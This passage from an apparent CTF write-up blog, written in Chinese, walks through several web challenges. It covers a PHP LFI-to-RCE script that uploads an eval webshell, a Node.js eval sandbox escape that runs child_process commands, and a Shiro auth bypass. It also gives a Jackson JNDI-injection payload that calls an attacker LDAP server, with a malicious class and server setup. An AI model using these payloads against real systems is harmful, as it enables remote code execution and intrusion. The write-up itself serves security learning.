print(req.text,url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.quote(b),a))</span><br></pre></td></tr></table></figure><p>得到下一关地址<code>flflflflag.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>($_GET[<span class="string">"file"</span>])</span><br></pre></td></tr></table></figure><p>因为前面目录扫到<code>dir.php</code>，可以联想到LFI2RCE中的php7+LFI+<code>segment fault</code></p><p>以前整理的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">'&lt;?php eval($_REQUEST[sky]);'</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">'http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url=url, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    url = <span class="string">'http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn/dir.php'</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    data = re.search(<span class="string">r"php[a-zA-Z0-9]&#123;1,&#125;"</span>, r.content).group(<span class="number">0</span>)</span><br><span class="line">    url = <span class="string">"http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn/flflflflag.php?file=/tmp/"</span>+data</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'sky'</span>:<span class="string">"phpinfo();"</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/25/BMLU13YcQtWexIG.png" alt="Snipaste_2020-04-25_10-57-49.png"></p><p>还需要绕下disable_func</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir</span><br></pre></td></tr></table></figure><p><code>ld_preload</code>，利用<code>error_log()</code>触发</p><hr><h3><span id="验证">验证🐎</span></h3><blockquote><p>参考过客师傅： <a href="https://guokeya.github.io/post/XxOKeal9U/" target="_blank" rel="noopener">https://guokeya.github.io/post/XxOKeal9U/</a> </p></blockquote><p>nodejs</p><p>源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">'./key.js'</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">'md5'</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正则匹配限制了表达式形式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">'./index.html'</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">'&#123;&#123;results&#125;&#125;'</span>, results.join(<span class="string">'&lt;br/&gt;'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">'PHPSESSION'</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>第一层绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>利用js弱类型，传<code>first=1&amp;second=[1]</code></p><p><code>[1].length</code>和<code>&quot;1&quot;.length</code>都是1</p><p><code>md5([1]+key[0])</code>，这里<code>+</code>的时候<code>[1]</code>会转换为<code>&quot;1&quot;</code></p><p>第二层</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = saferEval(req.body.e)</span><br><span class="line">results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用圆括号将所有选择项括起来，相邻的选择项之间用|分隔。但用圆括号会有一个副作用，使相关的匹配会被缓存，此时可用?:放在第一个选项前来消除这种副作用。</span><br><span class="line">其中 ?: 是非捕获元之一，还有两个非捕获元是 ?&#x3D; 和 ?!，这两个还有更多的含义，前者为正向预查，在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串，后者为负向预查，在任何开始不匹配该正则表达式模式的位置来匹配搜索字符串。</span><br></pre></td></tr></table></figure><p>上面的正则可以选择三种形式：</p><p>括号内表示0或1次</p><p>1、<code>Math(.aaaa)</code>形式</p><p>2、<code>[()+\-*/&amp;|^%&lt;&gt;=,?:]</code>里面的字符会被匹配上</p><p>3、<code>111(.)111(e111)</code>的形式会被匹配上</p><p>我理解是因为用了<code>?:</code>导致整个匹配出现问题</p><p>payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.x&#x3D;Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()))(Math+1)</span><br></pre></td></tr></table></figure><p> <code>(Math=&gt;(xxxxx)())(Math+1)</code>表示匿名函数， 定义一个<code>function</code>，传入参数名为<code>Math</code>，之后执行<code>xxxxx</code>，传入的参数值为<code>Math+1</code></p><p><code>Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()</code></p><p>原型链污染，先将<code>Math</code>赋值为<code>Math.constructor</code>即<code>Object</code>，然后设置<code>Object</code>的<code>construct()</code>方法为</p><p><code>return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;)</code></p><p>但是这里由于限制了字符，需要调用<code>fromCharCode()</code>，而该方法只能由<code>string</code>调用，因此前面传入<code>Math+1</code>，<code>+</code>表示字符串拼接会转化成为<code>string</code>类型，<code>string.constructor</code>为<code>funcion</code></p><p>最后通过<code>eval()</code>执行</p><p><img src="https://i.loli.net/2020/04/25/pBUC5dS4sm9Q7Vt.png" alt="Snipaste_2020-04-25_00-25-49.png"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;e&quot;:&quot;(Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.x&#x3D;Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]&#125;</span><br></pre></td></tr></table></figure><p>迷的还是这个正则。。</p><hr><h3><span id="ezshiro">ezShiro</span></h3><p>hint：<code>gadget在POM.xml内，jdk&gt;8u191，json反序列化</code></p><p>gadget应该是<code>commons-collections3.2.1</code>，根据<code>jdk&gt;8u191</code>限制，应该是可以使用CC5</p><p>json反序列化应该是fastjson或者jsckson的反序列化漏洞，</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"@type"</span> : <span class="string">"org.apache.tomcat.dbcp.dbcp.BasicDataSource"</span>,</span><br><span class="line">  <span class="attr">"driverClassLoader"</span> :</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"driverClassName"</span> : <span class="string">"$$BCEL$$+CC5"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将CC5的恶意对象进行 <code>BCEL</code>编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Path path = Paths.get(<span class="string">"poc.txt"</span>);</span><br><span class="line"><span class="keyword">byte</span>[] data = Files.readAllBytes(path);</span><br><span class="line"><span class="comment">//BCEL编码</span></span><br><span class="line">String s =  Utility.encode(data,<span class="keyword">true</span>);</span><br><span class="line">System.out.print(s);</span><br></pre></td></tr></table></figure><p>打了一发没成功</p><p>=========================重新做一下</p><blockquote><p>参考链接： <a href="https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/m0on' target=" _blank" rel="noopener" s-writeup.md">moon师傅</a></p></blockquote><p>访问<code>/json</code>会跳到<code>/login</code></p><p> <code>shiro</code>漏洞<code>CVE-2020-1957</code></p><p>使用<code>/;/json</code></p><blockquote><p><a href="https://blog.riskivy.com/shiro-权限绕过漏洞分析（cve-2020-1957）/" target="_blank" rel="noopener">Shiro 权限绕过漏洞分析（CVE-2020-1957）</a> </p></blockquote><p>设置了POST请求方式，post传<code>a=1</code>，提示<code>was expecting(&#39;true&#39;,&#39;false&#39; or null)</code></p><p>post传<code>true</code>，得到<code>jackson interface</code></p><p>查看<code>pom.xml</code></p><p>比较明显的有<code>ch.qos.logback</code>和<code>common-collections</code></p><p>这里<code>jackson</code>的可以利用<code>CVE-2019-14439</code></p><blockquote><p><a href="http://www.luyixian.cn/news_show_314453.aspx" target="_blank" rel="noopener">Jackson各个gadget的调用链</a></p><p><a href="https://srcincite.io/blog/2019/08/07/attacking-unmarshallers-jndi-injection-using-getter-based-deserialization.html" target="_blank" rel="noopener">JNDI Injection using Getter Based Deserialization Gadgets</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap:&#x2F;&#x2F;localhost:43658&#x2F;Calc&quot;&#125;]</span><br></pre></td></tr></table></figure><p>JNDI注入，开启一个ldap服务绑定恶意类</p><blockquote><p> 使用<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>方便的启动一个LDAP/RMI Ref Server  </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p>不知道题目环境后端是怎么解析json的，自己本地搭建测试使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试类<code>Test.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder d = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        d.append(<span class="string">"["</span>);</span><br><span class="line">        d.append(<span class="string">"\"ch.qos.logback.core.db.JNDIConnectionSource\""</span>);</span><br><span class="line">        d.append(<span class="string">","</span>);</span><br><span class="line">        d.append(<span class="string">"&#123;"</span>);</span><br><span class="line">        d.append(<span class="string">"\"jndiLocation\""</span>);</span><br><span class="line">        d.append(<span class="string">":"</span>);</span><br><span class="line">        d.append(<span class="string">"\"ldap://0.0.0.0:1389/EvilObject\""</span>);       <span class="comment">// payload</span></span><br><span class="line">        d.append(<span class="string">"&#125;"</span>);</span><br><span class="line">        d.append(<span class="string">"]"</span>);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        Object obj = objectMapper.readValue(d.toString(), java.lang.Object.class);</span><br><span class="line">        objectMapper.writeValueAsString(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意类<code>EvilObject.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先编译成<code>EvilObject.class</code>，再开个http服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\IdeaProjects\ctf-shiro\target\classes&gt;python -m SimpleHTTPServer 1233</span><br></pre></td></tr></table></figure><p>启动LDAP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;0.0.0.0:1233&#x2F;#EvilObject</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/25/IVRSjE2KutF7NrG.png" alt="Snipaste_2020-04-25_21-01-47.png"></p><p>在buu上做开个frps，本地配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line"># server_addr 为 FRP 服务端的公网 IP</span><br><span class="line">server_addr &#x3D; node3.buuoj.cn</span><br><span class="line"># server_port 为 FRP 服务端监听的端口</span><br><span class="line">server_port &#x3D; 26678</span><br><span class="line"></span><br><span class="line">[windows]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 1389</span><br><span class="line">remote_port &#x3D; 1234</span><br></pre></td></tr></table></figure><p>payload打一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap:&#x2F;&#x2F;0.0.0.0:1234&#x2F;EvilObject&quot;&#125;]</span><br></pre></td></tr></table></figure><p>没有反应，因为高版本<code>JVM</code>对<code>Reference Factory</code>远程加载类进行了安全限制，<code>JVM</code>不会信任<code>LDAP</code>对象反序列化过程中加载的远程类。此时，攻击者仍然可以利用受害者本地<code>CLASSPATH</code>中存在漏洞的反序列化<code>Gadget</code>达到绕过限制执行命令的目的。 </p><p>上面本地测试的java版本是<code>java1.8.0</code>，切换成<code>8u202</code>，还是能执行，不继续测试了。</p><p>尝试本地Gadget，一开始自己分析用CC5，wp使用的是CC8，</p><p>marshalsec无法利用序列化内容开启服务。</p><blockquote><p>参考<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java" target="_blank" rel="noopener">kxcode</a></p></blockquote><p>本地开启一个ldap服务，先试试CC5，使用<code>ysoserial</code>生成序列化数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HackerServer.src.main.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> HackerServer.src.main.java.CodebaseServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span 